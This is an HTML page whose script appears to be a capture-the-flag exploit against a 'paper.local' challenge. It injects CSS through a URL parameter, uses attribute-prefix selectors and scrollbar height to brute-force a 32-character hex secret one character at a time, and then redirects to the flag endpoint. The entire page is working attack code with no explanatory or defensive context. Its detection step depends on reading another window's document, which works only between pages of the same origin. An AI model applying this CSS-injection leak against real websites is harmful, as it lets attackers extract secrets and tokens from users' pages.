<!DOCTYPE html>
<html>
<body>
    <div id="status">Status: Initializing...</div>
    <script>
        const TARGET = "https://paper.local/secret?payload=";
        const ALPHABET = "0123456789abcdef".split("");
        let secret = "";

        async function leakChar(char) {
            const guess = secret + char;
            // This CSS forces a scrollbar to appear ONLY if the guess is right
            const payload = `
                <style>
                    body[secret^="${guess}"] #leak { height: 5000px; display: block; }
                    #leak { display: none; }
                </style>
                <div id="leak"></div>
            `;

            return new Promise((resolve) => {
                const win = window.open(TARGET + encodeURIComponent(payload), "_blank");
                
                let check = setInterval(() => {
                    try {
                        // We check if the scrollHeight of the new window increased
                        if (win.document.body.scrollHeight > 1000) {
                            clearInterval(check);
                            win.close();
                            resolve(true);
                        }
                    } catch(e) { /* waiting for load */ }
                }, 50);

                // Timeout after 1 second if no match
                setTimeout(() => { 
                    clearInterval(check); 
                    if (!win.closed) win.close(); 
                    resolve(false); 
                }, 1000);
            });
        }

        async function start() {
            for (let i = 0; i < 32; i++) {
                for (let c of ALPHABET) {
                    document.getElementById('status').innerText = `Testing: ${secret}${c}`;
                    if (await leakChar(c)) {
                        secret += c;
                        break;
                    }
                }
            }
            // Once found, go to the flag
            location.href = `https://paper.local/flag?secret=${secret}`;
        }

        start();
    </script>
</body>
</html>
